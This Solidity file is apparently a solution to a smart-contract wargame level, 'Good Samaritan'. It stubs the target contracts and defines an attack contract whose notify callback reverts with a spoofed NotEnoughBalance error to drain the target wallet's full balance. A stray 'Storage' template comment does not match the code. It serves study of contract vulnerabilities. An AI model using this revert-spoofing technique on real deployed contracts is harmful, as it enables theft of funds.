// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";


contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    function donate10(address dest_) external {}
    function transferRemainder(address dest_) external {}
    function setCoin(Coin coin_) external {}
}

contract Coin {
    mapping(address => uint256) public balances;

    function transfer(address dest_, uint256 amount_) external {}
}

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;
    function requestDonation() external returns(bool enoughBalance){ return true; }
}

interface INotifyable {
    function notify(uint256 amount) external;
}


/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract ExpGoodSamaritan is INotifyable, Destructible, Targeted {
    GoodSamaritan gs;
    constructor(address target_addr) payable Targeted(target_addr) {
        gs = GoodSamaritan(target_addr);
    }

    error NotEnoughBalance();

    function exploit() public payable {
        gs.requestDonation();
        gs.coin().balances(address(this));
    }
    /**
     */
    function notify(uint256 _amount) public {
        // revert if we have no money yet
        if (gs.coin().balances(address(this)) == 10) {
            revert NotEnoughBalance();
        }
    }
    receive() external payable {
    }
}